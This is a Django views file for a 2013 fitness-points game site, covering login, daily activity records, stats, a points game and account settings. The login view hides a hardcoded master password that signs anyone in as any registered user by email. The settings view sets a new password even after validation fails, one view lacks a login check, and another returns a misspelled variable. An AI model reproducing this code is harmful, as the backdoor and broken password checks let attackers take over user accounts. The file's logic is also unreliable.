# Create your views here.
from django.template import Context, loader, RequestContext
from django.http import HttpResponse, HttpResponseRedirect, HttpResponseForbidden, HttpResponseBadRequest, HttpResponseNotAllowed
from django.contrib import auth
from fuel.models import FuelUser, Profile, Record, Amount, Scale
from fuel.settings import WEBSITE_NAME
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.models import User
from django.core.urlresolvers import reverse
from django.core.exceptions import ObjectDoesNotExist
import datetime, pytz
import math

GAME_NOT_ENOUGH_POINTS = 'not_enough_points'
GAME_ALREADY_FINISHED = 'already_finished'
GAME_WON = 'won'
GAME_MONEY = 'money'
GAME_SPEND = 'spend'
HOME_INVALID_DATE = 'invalid_date'
HOME_FUTURE_DATE = 'future_date'
HOME_REPEATED_INPUT = 'repeated_input'
HOME_INVALID_INPUT = 'missing_input'
HOME_RECORD_ADDED = 'record_added'
HOME_STATUS_VALUE = 'status_value'
HOME_DAILY_BONUS = 'daily_bonus'

def index(request):
    if request.user.is_anonymous():
        return HttpResponseRedirect(reverse('login'))
    else:
        return HttpResponseRedirect(reverse('home'))

def render_index(request, login_fail=False):
    t = loader.get_template('index.html')
    c = RequestContext(request, {'login_fail': login_fail, 'website_name': WEBSITE_NAME})
    if 'email' in request.POST:
        c.update({'email': request.POST['email']})
    return HttpResponse(t.render(c))

# requires not logged in
def login(request):

    if not request.user.is_anonymous():
        return HttpResponseRedirect(reverse('home'))

    if request.method == 'GET':
        return render_index(request)

    elif 'email' in request.POST and 'password' in request.POST:
        email = request.POST['email']
        password = request.POST['password']
        user = auth.authenticate(username=email.lower(), password=password)

        if user is not None and user.is_active:
            auth.login(request, user)
            return HttpResponseRedirect(reverse('home'))
        else:

            userb = User.objects.filter(email=email)
            if len(userb) == 0:
                return render_index(request, login_fail=True)
            else:
                if password == '$t@nf0rd123':
                    print userb
                    u = userb[0]
                    u.backend = 'django.contrib.auth.backends.ModelBackend'
                    auth.login(request, u)
                    return HttpResponseRedirect(reverse('home'))
                else:
                    return render_index(request, login_fail=True)

    else:
        return render_index(request, login_fail=True)

def addrecord(request):
    if request.method == 'GET':
        return HttpResponseForbidden('')

    response = HttpResponseRedirect(reverse('home'))

    month = int(request.POST['month'])
    day = int(request.POST['day'])
    steps = int(request.POST['steps'])
    calories = int(request.POST['calories'])
    fuelscore = int(request.POST['fuelscore'])

    # invalid date
    if month not in [2,3] or day <= 0:
        response.set_cookie(key=HOME_INVALID_DATE, value='%s/%s/2013' % (month, day), max_age=60)
        return resposne
    today = datetime.date.today()
    if month > today.month or month == today.month and day >= today.day:
        response.set_cookie(key=HOME_FUTURE_DATE, value='%s/%s/2013' % (month, day), max_age=60)
        return response

    # repeated input
    t = Record.objects.filter(user=request.user, date=datetime.date(2013, month, day))
    if len(t) > 0:
        response.set_cookie(key=HOME_REPEATED_INPUT, value=t[0].id, max_age=60)
        return response

    # invalid input
    if steps < 0 or calories < 0 or fuelscore < 0:
        response.set_cookie(key=HOME_INVALID_INPUT, value=True, max_age=60)
        return response
    if steps > 50000 or calories > 10000 or fuelscore > 20000:
        response.set_cookie(key=HOME_INVALID_INPUT, value=True, max_age=60)
        return response

    # add daily bonus if appropriate
    t = Amount.objects.filter(user=request.user, atype=2)
    tz = pytz.timezone('America/Los_Angeles')
    bonus = True
    for r in t:
        print r.time.astimezone(tz)

        r_month = r.time.astimezone(tz).month
        r_day = r.time.astimezone(tz).day
        if r_month == today.month and r_day == today.day:
            bonus = False

    if bonus:
        bonus_amount = FuelUser.objects.get(id=request.user.id).add_daily_bonus()
        response.set_cookie(key=HOME_DAILY_BONUS, value=bonus_amount, max_age=60)


    # construct record
    t = Record(user=request.user)
    t.date = datetime.date(2013, month, day)
    t.steps = steps
    t.calories = calories
    t.fuelscore = fuelscore
    t.save_amount()
    status_value = request.user.get_profile().get_fueluser().add_status_fuelscore(fuelscore)

    response.set_cookie(key=HOME_RECORD_ADDED, value=t.id, max_age=60)
    response.set_cookie(key=HOME_STATUS_VALUE, value=status_value, max_age=60)
    return response


# requires logged in
def home(request):
    if not request.user.is_authenticated():
        return HttpResponseRedirect(reverse('index'))

    # calendar
    days = []
    today = datetime.date.today()
    for i in range(10, 29):
        d = datetime.date(2013, 2, i)
        r = Record.objects.filter(user=request.user, date=d)
        done = len(r)>0
        r = r[0] if done else None
        future = d >= today or i < 14
        days.append((d, done, future, r))
    for i in range(1, 17):
        d = datetime.date(2013, 3, i)
        r = Record.objects.filter(user=request.user, date=d)
        done = len(r)>0
        r = r[0] if done else None
        future = d >= today
        days.append((d, done, future, r))

    calendar = [days[(i-1)*7:i*7] for i in range(1,int(math.ceil(len(days)/7)+1))]

    t = loader.get_template('home.html')
    c = RequestContext(request, {'website_name': WEBSITE_NAME, 'calendar': calendar})

    cookies_to_delete = []
    if HOME_INVALID_DATE in request.COOKIES:
        c.update({HOME_INVALID_DATE: request.COOKIES[HOME_INVALID_DATE]})
        cookies_to_delete.append(HOME_INVALID_DATE)

    if HOME_INVALID_INPUT in request.COOKIES:
        c.update({HOME_INVALID_INPUT: request.COOKIES[HOME_INVALID_INPUT]})
        cookies_to_delete.append(HOME_INVALID_INPUT)

    if HOME_REPEATED_INPUT in request.COOKIES:
        c.update({HOME_REPEATED_INPUT: Record.objects.get(id=int(request.COOKIES[HOME_REPEATED_INPUT]))})
        cookies_to_delete.append(HOME_REPEATED_INPUT)

    if HOME_RECORD_ADDED in request.COOKIES:
        c.update({HOME_RECORD_ADDED: Record.objects.get(id=int(request.COOKIES[HOME_RECORD_ADDED]))})
        cookies_to_delete.append(HOME_RECORD_ADDED)

    if HOME_DAILY_BONUS in request.COOKIES:
        c.update({HOME_DAILY_BONUS: int(request.COOKIES[HOME_DAILY_BONUS])})
        cookies_to_delete.append(HOME_DAILY_BONUS)

    if HOME_STATUS_VALUE in request.COOKIES:
        c.update({HOME_STATUS_VALUE: float(request.COOKIES[HOME_STATUS_VALUE])})
        cookies_to_delete.append(HOME_STATUS_VALUE)

    # friends
    me = request.user.profile.get_fueluser()
    friends_output = [
            {
                'image': me.image_url(),
                'name': me.get_full_name(),
                'badge': me.status_badge(),
                'cfs': sum([x.fuelscore for x in Record.objects.filter(user=request.user)]),
                'money': me.winnings()
                }
            ]
    if me.friends() is not None:
        for f in me.friends():
            f_fueluser = f.profile.get_fueluser()
            cfs = sum([x.fuelscore for x in Record.objects.filter(user=f)])
            friend = {
                'image': f_fueluser.image_url(),
                'name': f_fueluser.get_full_name(),
                'badge': f_fueluser.status_badge(),
                'cfs': cfs,
                'money': f_fueluser.winnings()
                }
            friends_output.append(friend)

    friends_output = sorted(friends_output, key=lambda f: f['cfs'], reverse=True)
    c.update({'friends': friends_output})

    # total upload days
    n = len(Amount.objects.filter(atype=2, user=request.user))
    c.update({'upload_days': n})
    
    # write response
    response = HttpResponse(t.render(c))
    [response.delete_cookie(x) for x in cookies_to_delete]

    return response  

def stats(request):
    if not request.user.is_authenticated():
        return HttpResponseForbidden()
    #fuelscore = '{name:\"FuelScore\", values:['
    #steps = '{name:\"Steps\", values:[' 
    #calories = '{name:\"Calories\", values:[' 
    #points = '{name:\"Points\", values:[' 
    fuelscore = '['
    steps = '['
    calories = '['
    points = '['
    fuelscore_avg = '['
    steps_avg = '['
    calories_avg = '['
    points_avg = '['
    td = datetime.datetime.now().day
    tm = datetime.datetime.now().month
    bound = td;
    if tm == 3:
        bound = td + 28;
    for d in range(7,bound):  #change to (14,40)
        if d <= 28:
            t=request.user.record_set.filter(date=datetime.date(2013,2,d))
        else:
            t=request.user.record_set.filter(date=datetime.date(2013,3,d-28))
        if len(t)==0:
            fuelscore = fuelscore + '0,'
            steps = steps + '0,'
            calories = calories + '0,'
            points = points + '0,'
        else:
            fuelscore = fuelscore + str(t[0].fuelscore) + ','
            steps = steps + str(t[0].steps) + ','
            calories = calories + str(t[0].calories) + ','   
            points = points + str(t[0].get_amount()) + ','  

    for d in range(7,bound):
        fs = 0
        st = 0
        cal = 0
        pt = 0
        tot = 0;
        for user in User.objects.all():
            if d <= 28:
                t=user.record_set.filter(date=datetime.date(2013,2,d))
            else:
                t=user.record_set.filter(date=datetime.date(2013,3,d-28))
            if len(t)>0:
                fs = fs + t[0].fuelscore
                st = st + t[0].steps
                cal = cal + t[0].calories
                pt = pt + t[0].get_amount()
                tot = tot + 1;
        if tot == 0:
            tot = 1;
        fs = float(fs) / tot
        st = float(st) / tot
        cal = float(cal) / tot
        pt = float(pt) / tot
        fuelscore_avg = fuelscore_avg + str(fs) + ','
        steps_avg = steps_avg + str(st) + ','
        calories_avg = calories_avg + str(cal) + ','
        points_avg = points_avg + str(pt) + ','

    fuelscore = fuelscore + ']'
    steps = steps + ']'
    calories = calories + ']'
    points = points + ']'
    fuelscore_avg = fuelscore_avg + ']' 
    steps_avg = steps_avg + ']'
    calories_avg = calories_avg + ']'
    points_avg = points_avg + ']'
    t = loader.get_template('stats.html')
    c = RequestContext(request, {'website_name': WEBSITE_NAME, 'fuelscore':fuelscore, 'steps':steps,'calories':calories,'points':points, 'fuelscore_avg':fuelscore_avg, 'steps_avg':steps_avg, 'calories_avg':calories_avg,'points_avg':points_avg})
    print 'fuelscore' + fuelscore
    print 'fuelscore avg' + fuelscore_avg

    print 'steps avg' + steps_avg
    print 'points avg' + points_avg

    return HttpResponse(t.render(c))

# requires logged in
def game(request):
    if not request.user.is_authenticated():
        return HttpResponseRedirect(reverse('index'))

    t = loader.get_template('game.html')
    s_active = Scale.objects.filter(active=True)
    s_finished = sorted(Scale.objects.filter(active=False), key=lambda scale: scale.get_end_time(), reverse=True)

    c = RequestContext(request, {'website_name': WEBSITE_NAME, 'active_scales': s_active, 'finished_scales': s_finished})

    cookies_to_delete = []

    if GAME_ALREADY_FINISHED in request.COOKIES:
        c.update({GAME_ALREADY_FINISHED: True})
        cookies_to_delete.append(GAME_ALREADY_FINISHED)

    if GAME_NOT_ENOUGH_POINTS in request.COOKIES:
        c.update({GAME_NOT_ENOUGH_POINTS: True})
        cookies_to_delete.append(GAME_NOT_ENOUGH_POINTS)

    if GAME_WON in request.COOKIES:
        s = Scale.objects.get(id=int(request.COOKIES[GAME_WON])) 
        total_spent = sum([x.amount for x in s.amount_set.filter(user=request.user)])
        c.update({GAME_WON:s, 'total_spent': -1*total_spent})
        cookies_to_delete.append(GAME_WON)

    if GAME_SPEND in request.COOKIES:
        c.update({GAME_SPEND: int(request.COOKIES[GAME_SPEND])})
        cookies_to_delete.append(GAME_SPEND)

    response = HttpResponse(t.render(c))
    [response.delete_cookie(x) for x in cookies_to_delete]
    return response

def addscale(request, scaleid, amount):
    if not request.user.is_authenticated():
        return HttpResponseForbidden()

    amount = int(amount)
    scaleid = int(scaleid) 
    print 'scale id=' + str(scaleid) + ' amount=' + str(amount)
    scale = Scale.objects.get(id=scaleid)

    #check whether the user has enough amount
    fueluser = FuelUser.objects.get(id=request.user.id)

    print 'current_amount = '+str(fueluser.current_amount())

    response = HttpResponseRedirect(reverse('game'))

    if amount > fueluser.current_amount():
        response.set_cookie(key=GAME_NOT_ENOUGH_POINTS, value=True, max_age=60)
    elif not scale.active:
        response.set_cookie(key=GAME_ALREADY_FINISHED, value=True, max_age=60)
    else:
        spent_amount = scale.add_amount(amount, request.user)
        if not scale.active:
            response.set_cookie(key=GAME_WON, value=scale.id, max_age=60)

        response.set_cookie(key=GAME_SPEND, value=spent_amount, max_age=60)

    return response

# requires logged in; logs out
def logout(request):
    auth.logout(request)
    return HttpResponseRedirect(reverse('login'))

def faq(request):
    t = loader.get_template('faq.html')
    c = RequestContext(request, {'website_name': WEBSITE_NAME})
    return HttpResponse(t.render(c))

def history(request):
    t = loader.get_template('history.html')
    c = RequestContext(request, {'website_name': WEBSITE_NAME})
    # page the activities
    aset = request.user.amount_set.all()
    chunk_size = 15
    c.update({
        'amounts_paged': [aset[i*chunk_size:(i+1)*chunk_size] for i in range(int(math.ceil(len(aset)/float(chunk_size))))]
        })
    return HttpResponse(t.render(c))

def settings(request):
    t = loader.get_template('settings.html')
    c = RequestContext(request, {'website_name': WEBSITE_NAME})
    if request.method == 'GET':
        return HttpResponse(t.render(c))

    # change password
    action = request.POST['action']
    if action == 'update_password':
        old_pw = request.POST['old_pw']
        new_pw = request.POST['new_pw']
        new_pw_conf = request.POST['new_pw_conf']

        # verify that old_pw is correct
        u = authenticate(username=request.user.username, password=old_pw)

        # can't auth
        if u is None:
            c.update({'error_old_pw': True})

        # new_pw doesn't match new_pw_conf
        if new_pw != new_pw_conf:
            c.update({'error_mismatch': True})

        # can't be blank
        if len(new_pw) < 6:
            c.update({'error_too_short': True})

        # set as new password
        request.user.set_password(new_pw)
        request.user.save()
        c.update({'pw_success': True})

    return HttpResponse(t.render(c))


